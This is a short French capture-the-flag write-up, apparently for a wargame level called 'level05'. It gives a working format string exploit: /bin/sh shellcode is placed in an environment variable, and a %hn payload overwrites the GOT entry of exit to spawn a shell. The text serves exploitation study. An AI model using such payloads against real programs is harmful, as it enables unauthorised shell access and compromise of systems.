@@ -1,0 +1,19 @@
+Level extraimement simple, on voit tout de suite un format string exploit.
+On decide donc de remplacer la fonction exit par du shellcode dans l'environnement.
+on remarque pour commencer que notre entree standard va se trouver au 10eme octet
+de notre stack, on aura donc %10$n quelque part. Ensuite il nous faut l'addresse
+de notre shellcode, donc comme d'habitude:
+
+export EXPLOIT=`python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`
+echo 'int main(){printf("%p\n",getenv("EXPLOIT"));}' > /tmp/prog.c
+gcc -m32 -o /tmp/prog /tmp/prog.c ; /tmp/prog
+
+// On obtient donc l'addresse de notre shellcode   prenons ici 0xffffd8a5
+//nous avons besoin de 2 nombres:   A = 0xd8a5 - 8   et   B = 0xffff - 0xd8a5
+//Puis on construit notre payload de cette maniere (notez que addr de exit est 0x080497e0):
+
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%Ad" + "%10$hn" + "%Bd" + "%11$hn"' ; cat) | ./level05
+
+donc:
+
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55453d" + "%10$hn" + "%10074d" + "%11$hn"' ; cat) | ./level05
